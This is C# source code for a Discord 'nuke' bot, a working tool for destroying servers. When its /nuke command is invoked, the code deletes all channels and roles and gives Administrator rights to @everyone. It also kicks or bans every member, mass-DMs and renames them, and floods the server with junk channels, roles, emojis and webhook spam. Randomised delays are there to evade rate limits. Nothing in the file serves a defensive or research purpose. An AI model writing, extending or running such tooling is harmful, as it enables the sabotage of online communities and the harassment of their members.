using Discord;
using Discord.Net;
using Discord.Webhook;
using Discord.WebSocket;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net.Http;
using System.Threading;
using System.Threading.Tasks;

namespace DiscordNukeBot.Core
{
    public class Bot
    {
        private readonly NukeSettings _settings;
        private DiscordSocketClient _client;
        private CancellationTokenSource _cancellationTokenSource;

        public Bot(NukeSettings settings)
        {
            _settings = settings;
        }

        [Obsolete]
        public async Task RunBotAsync()
        {
            string token = TokenManager.GetToken();
            if (string.IsNullOrEmpty(token))
            {
                AppLogger.Error("Could not get token, bot cannot start. Please set a token in the settings.");
                return;
            }

            var config = new DiscordSocketConfig { GatewayIntents = GatewayIntents.All, LogLevel = LogSeverity.Info };
            _client = new DiscordSocketClient(config);
            _cancellationTokenSource = new CancellationTokenSource();

            _client.Log += HandleLogMessage;
            _client.Ready += OnReadyAsync;
            _client.InteractionCreated += OnInteractionCreatedAsync;

            try
            {
                await _client.LoginAsync(TokenType.Bot, token);
                await _client.StartAsync();
            }
            catch (Exception ex)
            {
                AppLogger.Error($"Bot login failed: {ex.Message}");
                AppLogger.Warning("Please check if your token is correct.");
                return;
            }

            AppLogger.Info("Bot has started. Waiting for commands...");
            try
            {
                await Task.Delay(Timeout.Infinite, _cancellationTokenSource.Token);
            }
            catch (TaskCanceledException)
            {
                AppLogger.Info("Bot shutdown signal received.");
                await _client.StopAsync();
                AppLogger.Info("Bot has been successfully stopped.");
            }
        }

        public void StopBot()
        {
            _cancellationTokenSource?.Cancel();
        }

        private Task HandleLogMessage(LogMessage message)
        {
            if (message.Exception is GatewayReconnectException)
            {
                AppLogger.Warning("[Discord.Net] Gateway is reconnecting automatically...");
                return Task.CompletedTask;
            }

            string logText = string.IsNullOrWhiteSpace(message.Message)
                ? $"Received a log with no message content from {message.Source}."
                : message.Message;

            var msg = $"[Discord.Net] {message.Source}: {logText}";

            if (message.Exception != null)
            {
                msg += $"\nException: {message.Exception}";
            }

            switch (message.Severity)
            {
                case LogSeverity.Critical: AppLogger.Critical(msg); break;
                case LogSeverity.Error: AppLogger.Error(msg); break;
                case LogSeverity.Warning: AppLogger.Warning(msg); break;
                case LogSeverity.Info when message.Message.Contains("Rate limit triggered"): AppLogger.Warning(msg); break;
                default: break;
            }
            return Task.CompletedTask;
        }


        [Obsolete]
        private async Task OnReadyAsync()
        {
            AppLogger.Success($"Nuke Bot {_client.CurrentUser.Username} is online.");
            try
            {
                var nukeCommand = new SlashCommandBuilder()
                    .WithName("nuke")
                    .WithDescription("[!!! Nuke] Immediately execute the ultimate parallel server destruction procedure.")
                    .WithDefaultMemberPermissions(null)
                    .WithDMPermission(false);
                await _client.CreateGlobalApplicationCommandAsync(nukeCommand.Build());
            }
            catch (HttpException ex)
            {
                AppLogger.Error($"Command registration failed: {ex.Message}");
            }
        }

        private async Task OnInteractionCreatedAsync(SocketInteraction interaction)
        {
            if (interaction is not SocketSlashCommand command || command.Data.Name != "nuke" || command.GuildId == null)
                return;

            try { await command.DeferAsync(ephemeral: true); } catch { }

            var guild = _client.GetGuild(command.GuildId.Value);
            if (guild == null)
                return;

            try
            {
                await command.ModifyOriginalResponseAsync(msg =>
                {
                    msg.Content = "`[Nuke SEQUENCE ACTIVATED. ABANDON ALL HOPE.]`";
                });
            }
            catch { }
            AppLogger.Warning($"[NUKE] Nuke procedure triggered on server \"{guild.Name}\" ({guild.Id})...");

            _ = Task.Run(async () =>
            {
                try
                {
                    await NukeGuildAsync(guild);
                }
                catch (Exception ex)
                {
                    AppLogger.Error($"[NUKE] Exception while nuking {guild.Name}: {ex}");
                }
            });
        }


        private async Task NukeGuildAsync(SocketGuild guild)
        {
            AppLogger.Info("Starting nuke procedure...");
            var random = new Random();

            // Helper for delays
            async Task Delay(int min, int max)
            {
                if (!_settings.UseRandomDelays)
                {
                    await Task.Delay(_settings.FixedDelayMs);
                    return;
                }
                await Task.Delay(random.Next(min, max));
            }

            async Task DelayAction(string actionType)
            {
                if (_settings.UseGranularDelays)
                {
                    switch (actionType)
                    {
                        case "channel": await Delay(_settings.MinDelayChannelCreation, _settings.MaxDelayChannelCreation); break;
                        case "role": await Delay(_settings.MinDelayRoleCreation, _settings.MaxDelayRoleCreation); break;
                        case "message": await Delay(_settings.MinDelayMessageSpam, _settings.MaxDelayMessageSpam); break;
                        case "member": await Delay(_settings.MinDelayMemberAction, _settings.MaxDelayMemberAction); break;
                        default: await Delay(_settings.MinDelayBetweenActionsMs, _settings.MaxDelayBetweenActionsMs); break;
                    }
                }
                else
                {
                    await Delay(_settings.MinDelayBetweenActionsMs, _settings.MaxDelayBetweenActionsMs);
                }
            }

            // --- Define all nuke actions as tasks ---
            var nukeActions = new List<Func<Task>>
            {
                // --- Kick Bots ---
                async () => {
                    if (!_settings.KickAllBots) return;
AppLogger.Info("[NUKE] Kicking all other bots...");
                    await guild.DownloadUsersAsync();
                    var botsToKick = guild.Users.Where(u => u.IsBot && u.Id != _client.CurrentUser.Id).ToList();
                    foreach (var bot in botsToKick)
                    {
                        try { await bot.KickAsync("Bot cleanup"); AppLogger.Success($"Kicked bot {bot.Username}"); }
                        catch (Exception ex) { AppLogger.Warning($"Failed to kick bot {bot.Username}: {ex.Message}"); }
                        await DelayAction("member");
                    }
                },

                // --- Prune Members ---
                async () => {
                    if (!_settings.PruneMembers) return;
                    AppLogger.Info($"[NUKE] Pruning members inactive for {_settings.PruneDays} day(s)...");
                    try
                    {
                        int prunedCount = await guild.PruneUsersAsync(_settings.PruneDays);
                        AppLogger.Success($"[NUKE] Pruned {prunedCount} inactive members.");
                    }
                    catch (Exception ex) { AppLogger.Error($"[NUKE] Failed to prune members: {ex.Message}"); }
                },

                // --- Grant Admin to @everyone ---
                async () => {
                    if (!_settings.GrantAdminToEveryone) return;
                    AppLogger.Info("[NUKE] Granting Administrator to @everyone...");
                    try
                    {
                        await guild.EveryoneRole.ModifyAsync(p => p.Permissions = new GuildPermissions((ulong)GuildPermission.Administrator));
                        AppLogger.Success("[NUKE] Successfully granted Administrator permissions to @everyone!");
                    }
                    catch (Exception e) { AppLogger.Error($"[NUKE] Failed to grant @everyone admin: {e.Message}"); }
                },

                // --- Delete All Roles ---
                async () => {
                    if (!_settings.DeleteRolesFirst) return;
                    AppLogger.Info("[NUKE] Deleting all manageable roles...");
                    var rolesToDelete = guild.Roles.Where(r => !r.IsManaged && r.IsEveryone && r.Position < guild.CurrentUser.Hierarchy).ToList();
                    foreach(var role in rolesToDelete)
                    {
                        try { await role.DeleteAsync(); }
                        catch (Exception ex) { AppLogger.Warning($"Failed to delete role {role.Name}: {ex.Message}"); }
                        await DelayAction("role");
                    }
                    AppLogger.Info("[NUKE] Finished deleting roles.");
                },

                // --- Delete All Channels ---
                async () => {
                    if (!_settings.DeleteChannelsFirst) return;
                    AppLogger.Info("[NUKE] Deleting all channels...");
                    var channelDeletionTasks = guild.Channels.Select(c => c.DeleteAsync().ContinueWith(t =>
                    {
                        if (t.IsFaulted) AppLogger.Warning($"Failed to delete channel: {t.Exception?.InnerException?.Message}");
                    }));
                    await Task.WhenAll(channelDeletionTasks);
                    AppLogger.Info("[NUKE] All channels deleted.");
                },

                // --- Server Modifications ---
                async () => {
                    AppLogger.Info("[NUKE] Applying server modifications...");
                    try
                    {
                        await guild.ModifyAsync(g =>
                        {
                            g.Name = _settings.GuildName;
                            if (_settings.SetVerificationLevelToMax) g.VerificationLevel = VerificationLevel.High;
                            if (_settings.SetNotificationsToMentionsOnly) g.DefaultMessageNotifications = DefaultMessageNotifications.MentionsOnly;
                            if (_settings.ChangeServerRegion)
                            {
                                var regions = guild.GetVoiceRegionsAsync().Result;
                                if (regions.Any()) g.RegionId = regions.ElementAt(random.Next(regions.Count)).Id;
                            }
                        });
                        AppLogger.Success($"Server name changed to '{_settings.GuildName}' and other settings applied.");

                        if (_settings.UseRandomIcon && _settings.RandomIconUrls.Any())
                        {
                            using var httpClient = new HttpClient( );
                            var iconUrl = _settings.RandomIconUrls[random.Next(_settings.RandomIconUrls.Count)];
                            try
                            {
                                var iconStream = await httpClient.GetStreamAsync(iconUrl );
                                await guild.ModifyAsync(g => g.Icon = new Image(iconStream));
                                AppLogger.Success("Server icon changed to a random image.");
                            }
                            catch (Exception ex) { AppLogger.Error($"Failed to download or set random icon: {ex.Message}"); }
                        }
                        else
                        {
                             await guild.ModifyAsync(g => g.Icon = null);
                             AppLogger.Info("Server icon removed.");
                        }
                    }
                    catch (Exception ex) { AppLogger.Error($"Failed to modify server: {ex.Message}"); }
                },

                // --- Create Junk Channels & Spam ---
                async () => {
                    AppLogger.Info("[NUKE] Creating junk channels and spamming...");
                    var channelCreationTasks = new List<Task>();
                    for (int i = 0; i < _settings.ChannelCount; i++)
                    {
                        var channelTask = guild.CreateTextChannelAsync($"{_settings.ChannelName}-{i}").ContinueWith(async t =>
                        {
                            if (!t.IsCompletedSuccessfully || t.Result == null)
                            {
                                AppLogger.Warning($"Failed to create channel: {t.Exception?.InnerException?.Message}");
                                return;
                            }
                            var channel = t.Result;
                            AppLogger.Info($"Created channel #{channel.Name}");

                            // Webhook Spam
                            if (_settings.UseWebhookSpam)
                            {
                                var webhooks = new List<IWebhook>();
                                for(int w = 0; w < _settings.WebhooksPerChannel; w++)
                                {
                                    try
                                    {
                                        webhooks.Add(await channel.CreateWebhookAsync(_settings.WebhookUsername));
                                    }
                                    catch (Exception ex) { AppLogger.Warning($"Failed to create webhook in #{channel.Name}: {ex.Message}"); }
                                }
                                if (webhooks.Any())
                                {
                                    var webhookClient = new DiscordWebhookClient(webhooks[random.Next(webhooks.Count)]);
                                    for (int j = 0; j < _settings.MessageSpamCount; j++)
                                    {
                                        var spamMessage = _settings.SpamMessages[random.Next(_settings.SpamMessages.Count)];
                                        try { await webhookClient.SendMessageAsync(spamMessage, username: _settings.WebhookUsername); }
                                        catch (Exception ex) { AppLogger.Warning($"Webhook failed to send message in #{channel.Name}: {ex.Message}"); }
                                        await DelayAction("message");
                                    }
                                    webhookClient.Dispose();
                                }
                            }
                            else // Normal Message Spam
                            {
                                for (int j = 0; j < _settings.MessageSpamCount; j++)
                                {
                                    var spamMessage = _settings.SpamMessages[random.Next(_settings.SpamMessages.Count)];
                                    try { await channel.SendMessageAsync(spamMessage); }
                                    catch (Exception ex) { AppLogger.Warning($"Failed to send message in #{channel.Name}: {ex.Message}"); }
                                    await DelayAction("message");
                                }
                            }
                        }, TaskContinuationOptions.OnlyOnRanToCompletion);
                        channelCreationTasks.Add(channelTask);
                        await DelayAction("channel");
                    }
                    await Task.WhenAll(channelCreationTasks);
                    AppLogger.Info($"[NUKE] Finished creating {_settings.ChannelCount} junk channels and spamming.");
                },

                // --- Create Junk Roles ---
                async () => {
                    AppLogger.Info("[NUKE] Creating junk roles...");
                    for (int i = 0; i < _settings.RoleCount; i++)
                    {
                        try
                        {
                            await guild.CreateRoleAsync($"{_settings.RoleName}-{i}", color: new Color((uint)random.Next(0x1000000)));
                        }
                        catch (Exception ex) { AppLogger.Warning($"Failed to create role: {ex.Message}"); }
                        await DelayAction("role");
                    }
                    AppLogger.Info($"[NUKE] Finished creating {_settings.RoleCount} junk roles.");
                },

                // --- Change All Nicknames ---
                async () => {
                    if (!_settings.ChangeAllNicknames) return;
                    AppLogger.Info("[NUKE] Changing all member nicknames...");
                    await guild.DownloadUsersAsync();
                    var membersToRename = guild.Users.Where(u => u.Id != guild.OwnerId && !u.IsBot).ToList();
                    foreach (var member in membersToRename)
                    {
                        try { await member.ModifyAsync(m => m.Nickname = _settings.NewNickname); }
                        catch (Exception) { /* Ignore, likely missing permissions */ }
                        await DelayAction("member");
                    }
                    AppLogger.Info("[NUKE] Finished changing nicknames.");
                },

                // --- DM All Members ---
                async () => {
                    if (!_settings.DmAllMembers || !_settings.DmMessages.Any()) return;
                    AppLogger.Info("[NUKE] DMing all members...");
                    await guild.DownloadUsersAsync();
                    var membersToDm = guild.Users.Where(u => !u.IsBot).ToList();
                    foreach (var member in membersToDm)
                    {
                        var dmMessage = _settings.DmMessages[random.Next(_settings.DmMessages.Count)];
                        try
                        {
                            await member.SendMessageAsync(dmMessage);
                            AppLogger.Info($"DMed {member.Username}");
                        }
                        catch (Exception) { /* Ignore, DMs might be closed */ }
                        await DelayAction("member");
                    }
                    AppLogger.Info("[NUKE] Finished DMing members.");
                },

                // --- Kick/Ban All Members ---
                async () => {
                    if (!_settings.KickAllMembers) return;
                    AppLogger.Info($"[NUKE] Preparing to {(_settings.BanMembersInsteadOfKick ? "ban" : "kick")} all members...");
                    await guild.DownloadUsersAsync();
                    var membersToProcess = guild.Users.Where(m => m.Id != _client.CurrentUser.Id && !m.IsBot && guild.OwnerId != m.Id).ToList();
                    foreach (var member in membersToProcess)
                    {
                        try
                        {
                            if (_settings.BanMembersInsteadOfKick)
                            {
                                await member.BanAsync(reason: _settings.BanReason);
                                AppLogger.Success($"Banned member {member.Username}");
                            }
                            else
                            {
                                await member.KickAsync("Nuke Execution.");
                                AppLogger.Success($"Kicked member {member.Username}");
                            }
                        }
                        catch (Exception ex) { AppLogger.Warning($"Failed to process member {member.Username}: {ex.Message}"); }
                        await DelayAction("member");
                    }
                    AppLogger.Info($"[NUKE] Completed processing members.");
                },

                // --- Unban All ---
                async () => {
                    if (!_settings.UnbanAll) return;
                    AppLogger.Info("[NUKE] Unbanning all previously banned users...");
                    var bans = await guild.GetBansAsync().FlattenAsync();
                    foreach (var ban in bans)
                    {
                        try
                        {
                            await guild.RemoveBanAsync(ban.User);
                            AppLogger.Success($"Unbanned user {ban.User.Username}");
                        }
                        catch (Exception ex) { AppLogger.Warning($"Failed to unban user {ban.User.Username}: {ex.Message}"); }
                        await DelayAction("member");
                    }
                    AppLogger.Info("[NUKE] Finished unbanning users.");
                },

                // --- Create Junk Emojis ---
                async () => {
                    if (_settings.EmojiCount <= 0 || string.IsNullOrEmpty(_settings.EmojiImageUrl)) return;
                    AppLogger.Info("[NUKE] Creating junk emojis...");
                    try
                    {
                        using var client = new HttpClient();
                        var emojiData = await client.GetByteArrayAsync(_settings.EmojiImageUrl);
                        var emojiImage = new Image(new MemoryStream(emojiData));
                        for (int i = 0; i < _settings.EmojiCount; i++)
                        {
                            try
                            {
                                var emote = await guild.CreateEmoteAsync($"{_settings.EmojiNamePrefix}{i}", emojiImage);
                                AppLogger.Success($"Created emoji {emote.Name}");
                            }
                            catch (Exception ex) { AppLogger.Warning($"Failed to create emoji: {ex.Message}"); }
                            await DelayAction("default");
                        }
                        AppLogger.Info($"[NUKE] Finished creating {_settings.EmojiCount} junk emojis.");
                    }
                    catch (Exception e) { AppLogger.Error($"[NUKE] Failed to download emoji source image: {e.Message}"); }
                }
            };

            // --- Execute Nuke Actions ---
            if (_settings.RandomizeExecutionOrder)
            {
                AppLogger.Info("[NUKE] Randomizing execution order...");
                nukeActions = nukeActions.OrderBy(a => random.Next()).ToList();
            }

            foreach (var action in nukeActions)
            {
                await action();
                await DelayAction("default"); // A small delay between major action groups
            }

            AppLogger.Success($"[NUKE] Nuke procedure for server \"{guild.Name}\" has completed.");
        }
    }
}